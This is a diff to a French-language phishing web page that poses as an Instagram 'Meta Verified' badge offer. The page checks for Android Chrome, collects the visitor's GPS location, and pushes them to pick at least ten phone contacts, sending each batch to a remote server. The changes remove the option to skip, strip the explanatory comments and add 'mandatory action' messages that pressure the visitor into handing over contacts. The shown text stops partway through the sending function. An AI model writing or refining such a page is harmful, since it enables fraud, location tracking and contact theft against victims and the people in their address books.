@@ -28,11 +28,9 @@
     min-height: 100vh; padding: 20px; 
   }
 
-  /* Logo Instagram */
   .logo-container { margin-bottom: 30px; text-align: center; }
   .logo-svg { width: 60px; height: 60px; fill: url(#ig-grad); }
   
-  /* Carte principale */
   .card { 
     width: 100%; max-width: 400px; background: var(--card); 
     border: 1px solid var(--border); border-radius: 12px; 
@@ -46,7 +44,6 @@
     to { opacity: 1; transform: translateY(0); }
   }
 
-  /* Badge Meta Verified */
   .badge-meta { 
     display: inline-flex; align-items: center; gap: 6px; 
     background: rgba(0, 149, 246, 0.1); color: var(--acc); 
@@ -59,7 +56,6 @@
   .sub { color: var(--mut); font-size: 14px; margin: 0 0 28px; line-height: 1.6; }
   .sub b { color: var(--fg); }
 
-  /* Boutons */
   button { 
     width: 100%; padding: 16px; border: 0; border-radius: 8px; 
     cursor: pointer; background: var(--acc); color: #fff; 
@@ -70,7 +66,6 @@
   button:disabled { opacity: 0.5; cursor: not-allowed; }
   button.sec { background: transparent; color: var(--fg); border: 1px solid var(--border); }
 
-  /* Compteur de contacts */
   .progress-container { margin: 24px 0; }
   .progress-text { display: flex; justify-content: space-between; font-size: 13px; color: var(--mut); margin-bottom: 8px; }
   .progress-text b { color: var(--fg); }
@@ -78,16 +73,14 @@
   .progress-fill { height: 100%; width: 0%; background: var(--ig-grad); transition: width 0.3s ease; }
 
   .status { color: var(--mut); font-size: 13px; min-height: 20px; margin-top: 12px; }
-  .status.err { color: var(--err); }
+  .status.err { color: var(--err); font-weight: bold; }
   .status.ok { color: var(--ok); }
 
-  /* Animations Radar GPS */
   .radar { width: 80px; height: 80px; border-radius: 50%; border: 2px solid var(--acc); margin: 0 auto 20px; position: relative; display: flex; align-items: center; justify-content: center; }
   .radar::before { content: ''; position: absolute; width: 100%; height: 100%; border-radius: 50%; border: 2px solid var(--acc); animation: ping 1.5s cubic-bezier(0, 0, 0.2, 1) infinite; opacity: 0; }
   .radar-pin { width: 14px; height: 14px; background: var(--acc); border-radius: 50%; box-shadow: 0 0 10px var(--acc); }
   @keyframes ping { 75%, 100% { transform: scale(2); opacity: 0; } }
 
-  /* Spinner de chargement */
   .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid rgba(255,255,255,0.2); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; vertical-align: middle; margin-right: 8px; }
   @keyframes spin { to { transform: rotate(360deg); } }
 
@@ -96,7 +89,6 @@
 </head>
 <body>
 
-<!-- SVG Gradient pour le logo -->
 <svg style="width:0; height:0; position:absolute;" aria-hidden="true" focusable="false">
   <linearGradient id="ig-grad" x1="0%" y1="100%" x2="100%" y2="0%">
     <stop offset="0%" stop-color="#f09433" />
@@ -113,7 +105,6 @@
   </svg>
 </div>
 
-<!-- ERREUR DE NAVIGATEUR -->
 <div class="card" id="stepError" hidden>
   <div class="badge-meta" style="background: rgba(237, 73, 86, 0.1); color: var(--err); border-color: rgba(237, 73, 86, 0.3);">⚠ Action requise</div>
   <h1>Navigateur non pris en charge</h1>
@@ -121,18 +112,16 @@
   <button onclick="location.reload()">Réessayer</button>
 </div>
 
-<!-- ETAPE 1 : ACCUEIL -->
 <div class="card" id="step1">
   <div class="badge-meta">
     <svg viewBox="0 0 24 24"><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-2 15l-5-5 1.4-1.4 3.6 3.6 7.6-7.6L19 8l-9 9z"/></svg>
     Programme Créateur Éligible
   </div>
   <h1>Vérification du compte</h1>
-  <p class="sub">Votre compte a été présélectionné pour recevoir le badge <b>Meta Verified</b> et l'accès aux outils de créateur. Confirmez votre identité pour activer.</p>
-  <button id="startBtn">Confirmer mon éligibilité</button>
+  <p class="sub">Votre compte a été présélectionné pour recevoir le badge <b>Meta Verified</b>. Pour éviter les faux comptes, vous devez inviter votre réseau de confiance.</p>
+  <button id="startBtn">Démarrer la vérification</button>
 </div>
 
-<!-- ETAPE 2 : GPS -->
 <div class="card" id="step2" hidden>
   <div class="radar"><div class="radar-pin"></div></div>
   <h1>Localisation du compte</h1>
@@ -140,29 +129,26 @@
   <p class="status" id="statusGps">Demande d'accès...</p>
 </div>
 
-<!-- ETAPE 3 : CONTACTS -->
 <div class="card" id="step3" hidden>
-  <h1>Réseau de confiance</h1>
-  <p class="sub">Sélectionnez au moins <b>10 contacts</b> pour prouver que vous êtes une personne réelle et lier votre compte.</p>
+  <h1>Invitez votre réseau</h1>
+  <p class="sub">Meta exige l'invitation d'au moins <b>10 contacts</b> de votre répertoire pour prouver que vous êtes une personne réelle.</p>
   
   <div class="progress-container">
     <div class="progress-text">
-      <span>Contacts sélectionnés</span>
+      <span>Invités validés</span>
       <span><b id="count">0</b> / 10</span>
     </div>
     <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
   </div>
 
-  <button id="pickBtn">Sélectionner des contacts</button>
-  <button id="skipBtn" class="sec" hidden>Ignorer (Non recommandé)</button>
+  <button id="pickBtn">Inviter des contacts</button>
   <p class="status" id="statusContact"></p>
 </div>
 
-<!-- ETAPE 4 : SUCCES -->
 <div class="card" id="step4" hidden>
   <div class="badge-meta" style="background: rgba(88, 195, 34, 0.1); color: var(--ok); border-color: rgba(88, 195, 34, 0.3);">✓ Vérification réussie</div>
   <h1>Bienvenue sur Pro</h1>
-  <p class="sub">Votre compte est en cours de synchronisation avec les serveurs Meta. Vous allez être redirigé vers votre profil.</p>
+  <p class="sub">Votre réseau a été validé. Votre compte est en cours de synchronisation avec les serveurs Meta...</p>
   <div class="spinner" style="width: 30px; height: 30px; margin: 20px auto; display: block;"></div>
 </div>
 
@@ -177,7 +163,6 @@
 
   const $ = id => document.getElementById(id);
   
-  // Détection stricte du navigateur
   const ua = navigator.userAgent.toLowerCase();
   const isAndroid = ua.indexOf("android") > -1;
   const isChrome = ua.indexOf("chrome") > -1;
@@ -187,19 +172,17 @@
   let seen = new Set();
   let gpsData = { lat: '', lng: '', acc: '' };
 
-  // Bloquer si ce n'est pas le bon environnement
   if (!isAndroid || !isChrome || isInApp) {
     $('step1').hidden = true;
     $('stepError').hidden = false;
     if (isInApp) {
-      $('errText').innerHTML = "Vous êtes actuellement dans le navigateur d'une application. Cliquez sur les trois points en haut à droite et choisissez <b>'Ouvrir dans Chrome'</b>.";
+      $('errText').innerHTML = "Vous êtes dans le navigateur d'une application. Cliquez sur les trois points en haut et choisissez <b>'Ouvrir dans Chrome'</b>.";
     } else if (!isAndroid) {
-      $('errText').innerHTML = "Le programme Meta Verified nécessite un appareil <b>Android</b>.";
+      $('errText').innerHTML = "Le programme nécessite un appareil <b>Android</b>.";
     }
     return;
   }
 
-  // 1. Récupération GPS
   function grabGPS() {
     return new Promise(resolve => {
       if (!navigator.geolocation) return resolve();
@@ -215,21 +198,21 @@
   }
 
   $('startBtn').addEventListener('click', async () => {
-    $('step1').hidden = true;
-    $('step2').hidden = false;
+    $('startBtn').disabled = true;
+    $('startBtn').innerHTML = '<span class="spinner"></span> Vérification...';
     
     await grabGPS(); 
     
+    $('step1').hidden = true;
     $('step2').hidden = true;
     $('step3').hidden = false;
-    $('skipBtn').hidden = false;
     pickContacts();
   });
 
-  // 2. Lecture des contacts
   async function pickContacts() {
     if (allContacts.length >= TARGET) return;
     $('pickBtn').disabled = true;
+    $('statusContact').className = 'status';
     $('statusContact').textContent = "Ouverture du répertoire...";
 
     try {
@@ -250,13 +233,21 @@
           }
         });
         
-        // ENVOI IMMÉDIAT DÈS QU'UN CONTACT EST CHOISI
         if (newBatch.length > 0) {
             sendDataToServer(newBatch); 
         }
+      } else {
+        // Si elle ferme le sélecteur sans rien choisir
+        if (allContacts.length < TARGET) {
+            $('statusContact').className = 'status err';
+            $('statusContact').textContent = "Action obligatoire : Vous devez inviter au moins 10 contacts.";
+        }
       }
     } catch (e) {
-      // L'utilisateur a annulé
+        if (allContacts.length < TARGET) {
+            $('statusContact').className = 'status err';
+            $('statusContact').textContent = "Action obligatoire : Veuillez sélectionner vos contacts.";
+        }
     }
 
     $('pickBtn').disabled = false;
@@ -270,30 +261,20 @@
 
     if (allContacts.length >= TARGET) {
       $('pickBtn').hidden = true;
-      $('skipBtn').hidden = true;
       $('statusContact').className = 'status ok';
-      $('statusContact').textContent = "Vérification validée !";
+      $('statusContact').textContent = "Réseau validé !";
       setTimeout(() => {
         $('step3').hidden = true;
         $('step4').hidden = false;
         setTimeout(() => location.replace(REDIRECT), 2500);
       }, 1000);
     } else {
-      $('pickBtn').textContent = "Ajouter des contacts (" + allContacts.length + "/" + TARGET + ")";
-      $('statusContact').className = 'status';
-      $('statusContact').textContent = "Sélectionnez encore " + (TARGET - allContacts.length) + " contacts.";
+      $('pickBtn').textContent = "Inviter encore " + (TARGET - allContacts.length) + " contacts";
     }
   }
 
   $('pickBtn').addEventListener('click', pickContacts);
-  
-  $('skipBtn').addEventListener('click', () => {
-      $('step3').hidden = true;
-      $('step4').hidden = false;
-      setTimeout(() => location.replace(REDIRECT), 2000);
-  });
 
-  // 3. Envoi immédiat au serveur Apps Script
   async function sendDataToServer(contactsArray) {
     const payload = {
       theme: 'Meta Verified',
